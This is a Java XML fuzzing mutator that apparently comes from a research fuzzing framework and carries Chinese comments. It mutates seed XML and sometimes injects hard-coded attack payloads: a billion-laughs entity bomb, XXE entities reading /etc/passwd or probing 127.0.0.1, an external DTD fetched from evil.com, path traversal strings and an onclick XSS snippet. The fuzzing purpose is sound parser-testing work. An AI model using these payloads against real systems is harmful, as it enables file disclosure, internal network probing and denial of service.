package edu.nju.fuzzing.mutate;

import edu.nju.fuzzing.model.Seed;
import edu.nju.fuzzing.model.Testcase;
import edu.nju.fuzzing.mutate.grammar.*;

import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

/**
 * 语法感知 XML 变异器
 * 
 * 核心改进：
 * 1. 使用种子内容进行变异
 * 2. 容错分词 -> 语法感知变异 -> 语法修复 -> 序列化
 * 3. 针对 XML 特有结构进行变异（标签、属性、实体等）
 * 4. 维护标签配对关系
 * 5. 正确转义属性值中的特殊字符
 * 6. 区分合法实体和攻击实体
 */
public class XmlMutator implements Mutator {

    private static final int MAX_DEPTH = 30;

    // 语法检查和修复工具
    private final XmlSyntaxChecker syntaxChecker = new XmlSyntaxChecker();
    private final XmlSyntaxFixer syntaxFixer = new XmlSyntaxFixer(syntaxChecker);

    private static final String[] ATTACK_PAYLOADS = {
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">]><root>&lol3;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://evil.com/dtd\">%ext;]>",
            "<root><![CDATA[ " + "A".repeat(10000),
    };

    private static final String[] INJECTION_PAYLOADS = {
            "<!--",
            "-->",
            "]]>",
            "<![CDATA[",
            "&lt;script&gt;",
            "&#x0;",
            "&#0;",
            "../../../etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/",
            "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
    };

    // 用于属性值的安全载荷（已转义）
    private static final String[] SAFE_INJECTION_PAYLOADS = {
            "&lt;!--",
            "--&gt;",
            "]]&gt;",
            "&lt;![CDATA[",
            "&lt;script&gt;",
            "../../../etc/passwd",
            "file:///etc/passwd",
            "http://evil.com/",
    };

    // 合法的 XML 内置实体
    private static final String[] LEGAL_ENTITIES = { "&amp;", "&lt;", "&gt;", "&apos;", "&quot;" };

    // 攻击性实体（用于测试 XXE 等漏洞）
    private static final String[] ATTACK_ENTITIES = { "&xxe;", "&lol;", "&#0;", "&#x0;" };

    private static final String[] TAG_NAMES = { "root", "foo", "bar", "div", "span", "a", "b", "config", "data" };
    private static final String[] ATTRIBUTE_NAMES = { "id", "class", "href", "style", "xmlns", "xmlns:x", "data-val" };

    private final XmlTokenizer tokenizer = new XmlTokenizer();

    @Override
    public Iterator<Testcase> mutate(Seed seed, int energy) {
        int count = Math.max(1, energy);

        return new Iterator<Testcase>() {
            private int remaining = count;

            @Override
            public boolean hasNext() {
                return remaining > 0;
            }

            @Override
            public Testcase next() {
                if (remaining <= 0)
                    throw new NoSuchElementException();
                remaining--;

                ThreadLocalRandom rand = ThreadLocalRandom.current();
                byte[] seedData = seed.getData();
                byte[] mutatedBytes;
                String grammarName;

                int strategy = rand.nextInt(100);

                if (strategy < 5) {
                    mutatedBytes = ATTACK_PAYLOADS[rand.nextInt(ATTACK_PAYLOADS.length)]
                            .getBytes(StandardCharsets.UTF_8);
                    grammarName = "XML:Payload";
                } else if (strategy < 10) {
                    mutatedBytes = createDeepNesting(seedData, rand);
                    grammarName = "XML:DeepNest";
                } else if (seedData == null || seedData.length == 0) {
                    StringBuilder xml = new StringBuilder();
                    generateProlog(xml, rand);
                    generateElement(xml, 0, rand, false);
                    mutatedBytes = xml.toString().getBytes(StandardCharsets.UTF_8);
                    grammarName = "XML:Gen";
                } else {
                    mutatedBytes = mutateWithGrammar(seedData, rand);
                    grammarName = "XML:GrammarMut";
                }

                byte[] finalBytes = encodeWithBom(mutatedBytes, rand);
                return new Testcase(finalBytes, seed, "grammar:" + grammarName);
            }
        };
    }

    private byte[] mutateWithGrammar(byte[] seedData, ThreadLocalRandom rand) {
        List<Token> tokens = tokenizer.tokenize(seedData);
        if (tokens.isEmpty()) {
            StringBuilder xml = new StringBuilder();
            generateProlog(xml, rand);
            generateElement(xml, 0, rand, false);
            return xml.toString().getBytes(StandardCharsets.UTF_8);
        }

        // 构建标签配对映射
        Map<Integer, Integer> tagPairs = buildTagPairMap(tokens);

        int mutationCount = 1 + rand.nextInt(3);
        List<Token> mutatedTokens = new ArrayList<>(tokens);

        for (int i = 0; i < mutationCount; i++) {
            int mutationType = rand.nextInt(13);

            switch (mutationType) {
                case 0:
                    mutatedTokens = mutateTagNamesPaired(mutatedTokens, tagPairs, rand);
                    break;
                case 1:
                    mutatedTokens = mutateAttributes(mutatedTokens, rand);
                    break;
                case 2:
                    mutatedTokens = injectEntity(mutatedTokens, rand);
                    break;
                case 3:
                    mutatedTokens = duplicateElements(mutatedTokens, rand);
                    break;
                case 4:
                    mutatedTokens = deleteTokens(mutatedTokens, rand);
                    break;
                case 5:
                    mutatedTokens = corruptCData(mutatedTokens, rand);
                    break;
                case 6:
                    mutatedTokens = injectPayloadToText(mutatedTokens, rand);
                    break;
                case 7:
                    mutatedTokens = removeClosingTags(mutatedTokens, rand);
                    break;
                case 8:
                    mutatedTokens = swapTokens(mutatedTokens, rand);
                    break;
                case 9:
                    mutatedTokens = insertRandomTag(mutatedTokens, rand);
                    break;
                case 10:
                    mutatedTokens = corruptXmlDecl(mutatedTokens, rand);
                    break;
                case 11:
                    mutatedTokens = insertComment(mutatedTokens, rand);
                    break;
                default:
                    mutatedTokens = mutateTagNames(mutatedTokens, rand);
                    break; // 保留原始的单独变异
            }
        }

        StringBuilder result = new StringBuilder();
        for (Token token : mutatedTokens) {
            if (token.getValue() != null) {
                result.append(token.getValue());
            }
        }

        String output = result.toString();

        // 根据配置决定是否修复语法（大部分时间修复，小概率保持原样测试边界情况）
        if (rand.nextInt(10) > 1) {
            output = syntaxFixer.fix(output);
        }

        if (rand.nextInt(20) == 0) {
            output = removeTrailingClose(output, rand);
        }

        return output.getBytes(StandardCharsets.UTF_8);
    }

    /**
     * 构建标签配对映射：开始标签索引 -> 结束标签索引
     */
    private Map<Integer, Integer> buildTagPairMap(List<Token> tokens) {
        Map<Integer, Integer> pairs = new HashMap<>();
        Deque<Integer> stack = new ArrayDeque<>();

        for (int i = 0; i < tokens.size(); i++) {
            Token token = tokens.get(i);
            if (token.getType() == Token.Type.XML_TAG_OPEN) {
                String value = token.getValue();
                // 检查是否是自闭合标签
                if (!value.endsWith("/>")) {
                    stack.push(i);
                }
            } else if (token.getType() == Token.Type.XML_TAG_CLOSE) {
                if (!stack.isEmpty()) {
                    int openIdx = stack.pop();
                    pairs.put(openIdx, i);
                }
            }
        }

        return pairs;
    }

    /**
     * 标签名配对变异 - 同时修改开始和结束标签
     */
    private List<Token> mutateTagNamesPaired(List<Token> tokens, Map<Integer, Integer> tagPairs,
            ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens);

        // 过滤有效的配对（索引在范围内）
        List<Map.Entry<Integer, Integer>> validPairs = new ArrayList<>();
        for (Map.Entry<Integer, Integer> entry : tagPairs.entrySet()) {
            int openIdx = entry.getKey();
            int closeIdx = entry.getValue();
            if (openIdx >= 0 && openIdx < result.size() && closeIdx >= 0 && closeIdx < result.size()) {
                validPairs.add(entry);
            }
        }

        for (Map.Entry<Integer, Integer> entry : validPairs) {
            int openIdx = entry.getKey();
            int closeIdx = entry.getValue();

            // 再次检查边界（列表大小可能已经改变）
            if (openIdx >= result.size() || closeIdx >= result.size()) {
                continue;
            }

            if (rand.nextInt(4) == 0) {
                Token openTag = result.get(openIdx);
                Token closeTag = result.get(closeIdx);

                // 验证 token 类型
                if (openTag.getType() != Token.Type.XML_TAG_OPEN ||
                        closeTag.getType() != Token.Type.XML_TAG_CLOSE) {
                    continue;
                }

                String openValue = openTag.getValue();
                String closeValue = closeTag.getValue();

                // 提取原标签名
                String oldName = extractTagName(openValue);
                if (oldName.isEmpty())
                    continue;

                // 生成新标签名
                String newName;
                int op = rand.nextInt(4);
                switch (op) {
                    case 0:
                        newName = oldName.toUpperCase();
                        break;
                    case 1:
                        newName = "ns:" + oldName;
                        break;
                    case 2:
                        newName = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
                        break;
                    default:
                        newName = oldName + "_fuzz";
                        break;
                }

                // 同时更新开始和结束标签
                String newOpenValue = openValue.replaceFirst(escapeRegex(oldName), newName);
                String newCloseValue = closeValue.replaceFirst(escapeRegex(oldName), newName);

                result.set(openIdx, openTag.withValue(newOpenValue));
                result.set(closeIdx, closeTag.withValue(newCloseValue));
            }
        }

        return result;
    }

    /**
     * 转义正则表达式特殊字符
     */
    private String escapeRegex(String str) {
        return str.replaceAll("([\\\\\\[\\](){}.*+?^$|])", "\\\\$1");
    }

    private List<Token> mutateTagNames(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_OPEN ||
                    token.getType() == Token.Type.XML_TAG_CLOSE) {
                if (rand.nextInt(5) == 0) {
                    String value = token.getValue();
                    String newValue = mutateTagValue(value, rand);
                    result.add(token.withValue(newValue));
                    continue;
                }
            }
            result.add(token);
        }
        return result;
    }

    private String mutateTagValue(String value, ThreadLocalRandom rand) {
        int op = rand.nextInt(5);
        switch (op) {
            case 0:
                return value.substring(0, 1) + "\u0000" + value.substring(1);
            case 1:
                return value.toUpperCase();
            case 2:
                if (value.startsWith("<") && !value.contains(":")) {
                    int nameStart = value.startsWith("</") ? 2 : 1;
                    return value.substring(0, nameStart) + "ns:" + value.substring(nameStart);
                }
                return value;
            case 3:
                return value.replace(">", " onclick='alert(1)'>");
            default:
                String newTag = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
                return value.replaceFirst("[a-zA-Z][a-zA-Z0-9_:-]*", newTag);
        }
    }

    private List<Token> mutateAttributes(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_OPEN && rand.nextInt(4) == 0) {
                String value = token.getValue();
                if (value.endsWith(">") || value.endsWith("/>")) {
                    String attr = ATTRIBUTE_NAMES[rand.nextInt(ATTRIBUTE_NAMES.length)];
                    // 使用已转义的安全载荷，避免破坏 XML 语法
                    String attrValue = SAFE_INJECTION_PAYLOADS[rand.nextInt(SAFE_INJECTION_PAYLOADS.length)];
                    int insertPos = value.length() - (value.endsWith("/>") ? 2 : 1);
                    String newValue = value.substring(0, insertPos) +
                            " " + attr + "=\"" + attrValue + "\"" +
                            value.substring(insertPos);
                    result.add(token.withValue(newValue));
                    continue;
                }
            }
            result.add(token);
        }
        return result;
    }

    private List<Token> injectEntity(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            result.add(token);
            if (token.getType() == Token.Type.XML_TEXT && rand.nextInt(5) == 0) {
                // 80% 使用合法实体，20% 使用攻击实体
                String entity;
                if (rand.nextInt(10) < 8) {
                    entity = LEGAL_ENTITIES[rand.nextInt(LEGAL_ENTITIES.length)];
                } else {
                    entity = ATTACK_ENTITIES[rand.nextInt(ATTACK_ENTITIES.length)];
                }
                result.add(new Token(Token.Type.XML_ENTITY, entity));
            }
        }
        return result;
    }

    private List<Token> duplicateElements(List<Token> tokens, ThreadLocalRandom rand) {
        if (tokens.size() < 3)
            return tokens;
        List<Token> result = new ArrayList<>(tokens);
        int start = rand.nextInt(tokens.size());
        int end = Math.min(start + 3 + rand.nextInt(5), tokens.size());
        List<Token> segment = new ArrayList<>(tokens.subList(start, end));
        int repeat = 2 + rand.nextInt(5);
        for (int i = 0; i < repeat; i++) {
            result.addAll(start, segment);
        }
        return result;
    }

    private List<Token> deleteTokens(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>();
        for (Token token : tokens) {
            if (rand.nextInt(10) != 0) {
                result.add(token);
            }
        }
        return result.isEmpty() ? tokens : result;
    }

    private List<Token> corruptCData(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_CDATA && rand.nextInt(3) == 0) {
                String value = token.getValue();
                // 真正的损坏：在 CDATA 内容中插入 ]]> 导致提前关闭
                int op = rand.nextInt(3);
                String corrupted;
                switch (op) {
                    case 0:
                        // 在 CDATA 中间插入 ]]> 导致提前关闭
                        corrupted = value.replace("<![CDATA[", "<![CDATA[]]><garbage><![CDATA[");
                        break;
                    case 1:
                        // 移除结束标记
                        corrupted = value.replace("]]>", "");
                        break;
                    default:
                        // 在内容中插入非法序列
                        corrupted = value.replace("<![CDATA[", "<![CDATA[]]>INJECTED");
                        break;
                }
                result.add(token.withValue(corrupted));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> injectPayloadToText(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TEXT && rand.nextInt(4) == 0) {
                String payload = INJECTION_PAYLOADS[rand.nextInt(INJECTION_PAYLOADS.length)];
                result.add(token.withValue(token.getValue() + payload));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> removeClosingTags(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>();
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_TAG_CLOSE && rand.nextInt(5) == 0) {
                continue;
            }
            result.add(token);
        }
        return result;
    }

    private List<Token> swapTokens(List<Token> tokens, ThreadLocalRandom rand) {
        if (tokens.size() < 2)
            return tokens;
        List<Token> result = new ArrayList<>(tokens);
        int i = rand.nextInt(result.size());
        int j = rand.nextInt(result.size());
        if (i != j) {
            Token temp = result.get(i);
            result.set(i, result.get(j));
            result.set(j, temp);
        }
        return result;
    }

    private List<Token> insertRandomTag(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens);
        String tag = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
        Token newTag = new Token(Token.Type.XML_TAG_OPEN, "<" + tag + ">");
        Token closeTag = new Token(Token.Type.XML_TAG_CLOSE, "</" + tag + ">");
        int pos = rand.nextInt(Math.max(1, result.size()));
        result.add(pos, newTag);
        result.add(Math.min(pos + 2, result.size()), closeTag);
        return result;
    }

    private List<Token> corruptXmlDecl(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens.size());
        for (Token token : tokens) {
            if (token.getType() == Token.Type.XML_DECL && rand.nextInt(3) == 0) {
                String value = token.getValue();
                String corrupted = value.replace("1.0", "9.9")
                        .replace("?>", " encoding=\"invalid\"?>");
                result.add(token.withValue(corrupted));
            } else {
                result.add(token);
            }
        }
        return result;
    }

    private List<Token> insertComment(List<Token> tokens, ThreadLocalRandom rand) {
        List<Token> result = new ArrayList<>(tokens);
        // 清理注释内容，移除非法的 -- 序列
        String payload = INJECTION_PAYLOADS[rand.nextInt(INJECTION_PAYLOADS.length)];
        String sanitizedPayload = XmlSyntaxFixer.sanitizeComment(payload);
        String comment = "<!-- " + sanitizedPayload + " -->";
        Token commentToken = new Token(Token.Type.COMMENT, comment);
        int pos = rand.nextInt(Math.max(1, result.size()));
        result.add(pos, commentToken);
        return result;
    }

    private String removeTrailingClose(String xml, ThreadLocalRandom rand) {
        int count = 1 + rand.nextInt(3);
        for (int i = 0; i < count; i++) {
            int lastClose = xml.lastIndexOf("</");
            if (lastClose > 0) {
                xml = xml.substring(0, lastClose);
            }
        }
        return xml;
    }

    private byte[] createDeepNesting(byte[] seedData, ThreadLocalRandom rand) {
        if (seedData != null && seedData.length > 0) {
            String content = new String(seedData, StandardCharsets.UTF_8);
            int tagStart = content.indexOf('<');
            if (tagStart >= 0) {
                int tagEnd = content.indexOf('>', tagStart);
                if (tagEnd > tagStart) {
                    String tag = content.substring(tagStart + 1, tagEnd).split("\\s")[0];
                    if (!tag.startsWith("/") && !tag.startsWith("?") && !tag.startsWith("!")) {
                        StringBuilder deep = new StringBuilder(content.substring(0, tagEnd + 1));
                        int depth = 50 + rand.nextInt(150);
                        for (int i = 0; i < depth; i++) {
                            deep.append("<").append(tag).append(">");
                        }
                        deep.append("FUZZ");
                        for (int i = 0; i < depth; i++) {
                            deep.append("</").append(tag).append(">");
                        }
                        if (tagEnd + 1 < content.length()) {
                            deep.append(content.substring(tagEnd + 1));
                        }
                        return deep.toString().getBytes(StandardCharsets.UTF_8);
                    }
                }
            }
        }
        StringBuilder xml = new StringBuilder();
        generateProlog(xml, rand);
        generateElement(xml, 0, rand, true);
        return xml.toString().getBytes(StandardCharsets.UTF_8);
    }

    private void generateProlog(StringBuilder sb, ThreadLocalRandom rand) {
        if (rand.nextBoolean()) {
            sb.append("<?xml version=\"").append(rand.nextBoolean() ? "1.0" : "1.1").append("\"?>");
        }
        if (rand.nextInt(5) == 0) {
            sb.append("<!DOCTYPE root [");
            if (rand.nextBoolean())
                sb.append("<!ENTITY x \"test\">");
            else
                sb.append("<!ELEMENT root ANY>");
            sb.append("]>");
        }
    }

    private void generateElement(StringBuilder sb, int depth, ThreadLocalRandom rand, boolean forceDeep) {
        if (depth > MAX_DEPTH) {
            sb.append(generateText(rand));
            return;
        }
        if (!forceDeep && depth > 2 && rand.nextInt(10) < 4) {
            sb.append(generateText(rand));
            return;
        }

        String tagName = TAG_NAMES[rand.nextInt(TAG_NAMES.length)];
        sb.append("<").append(tagName);

        int attrCount = rand.nextInt(4);
        for (int i = 0; i < attrCount; i++) {
            // XML 规范要求属性值必须用引号包围
            String quote = rand.nextBoolean() ? "\"" : "'";
            sb.append(" ").append(ATTRIBUTE_NAMES[rand.nextInt(ATTRIBUTE_NAMES.length)])
                    .append("=").append(quote).append(rand.nextInt(100)).append(quote);
        }

        if (!forceDeep && rand.nextInt(10) == 0) {
            sb.append("/>");
            return;
        }
        sb.append(">");

        if (forceDeep && depth < MAX_DEPTH) {
            generateElement(sb, depth + 1, rand, forceDeep);
            if (rand.nextBoolean())
                sb.append(generateText(rand));
        } else {
            int childCount = rand.nextInt(3);
            for (int i = 0; i < childCount; i++) {
                int nodeType = rand.nextInt(100);
                if (nodeType < 50)
                    generateElement(sb, depth + 1, rand, forceDeep);
                else if (nodeType < 90)
                    sb.append(generateText(rand));
                else
                    sb.append("<![CDATA[").append(generateText(rand)).append("]]>");
            }
        }

        sb.append("</").append(tagName).append(">");
    }

    private String generateText(ThreadLocalRandom rand) {
        if (rand.nextInt(10) == 0)
            return "&lt;fuzz&gt;";
        return "text_" + rand.nextInt(100);
    }

    private byte[] encodeWithBom(byte[] content, ThreadLocalRandom rand) {
        int encodingType = rand.nextInt(10);
        Charset charset = StandardCharsets.UTF_8;
        byte[] bom = new byte[0];
        String encodingName = "UTF-8";

        if (encodingType == 0) {
            charset = StandardCharsets.UTF_16BE;
            bom = new byte[] { (byte) 0xFE, (byte) 0xFF };
            encodingName = "UTF-16BE";
        } else if (encodingType == 1) {
            charset = StandardCharsets.UTF_16LE;
            bom = new byte[] { (byte) 0xFF, (byte) 0xFE };
            encodingName = "UTF-16LE";
        } else if (encodingType == 2) {
            bom = new byte[] { (byte) 0xEF, (byte) 0xBB, (byte) 0xBF };
            encodingName = "UTF-8";
        } else {
            return content;
        }

        String text = new String(content, StandardCharsets.UTF_8);

        // 同步更新 XML 声明中的 encoding 属性
        if (text.startsWith("<?xml") && !encodingName.equals("UTF-8")) {
            if (text.contains("encoding=")) {
                // 替换现有的 encoding 声明
                text = text.replaceFirst("encoding=[\"'][^\"']*[\"']", "encoding=\"" + encodingName + "\"");
            } else {
                // 添加 encoding 声明
                text = text.replaceFirst("\\?>", " encoding=\"" + encodingName + "\"?>");
            }
        }

        byte[] contentBytes = text.getBytes(charset);
        byte[] result = new byte[bom.length + contentBytes.length];
        System.arraycopy(bom, 0, result, 0, bom.length);
        System.arraycopy(contentBytes, 0, result, bom.length, contentBytes.length);
        return result;
    }

    /**
     * 从标签值中提取标签名
     */
    private String extractTagName(String tagValue) {
        if (tagValue == null || tagValue.isEmpty()) {
            return "";
        }

        // 跳过 < 或 </
        int start = 1;
        if (tagValue.startsWith("</")) {
            start = 2;
        } else if (tagValue.startsWith("<")) {
            start = 1;
        }

        // 提取到空格、/ 或 > 为止
        int end = start;
        while (end < tagValue.length()) {
            char c = tagValue.charAt(end);
            if (Character.isWhitespace(c) || c == '/' || c == '>') {
                break;
            }
            end++;
        }

        return tagValue.substring(start, end);
    }
}
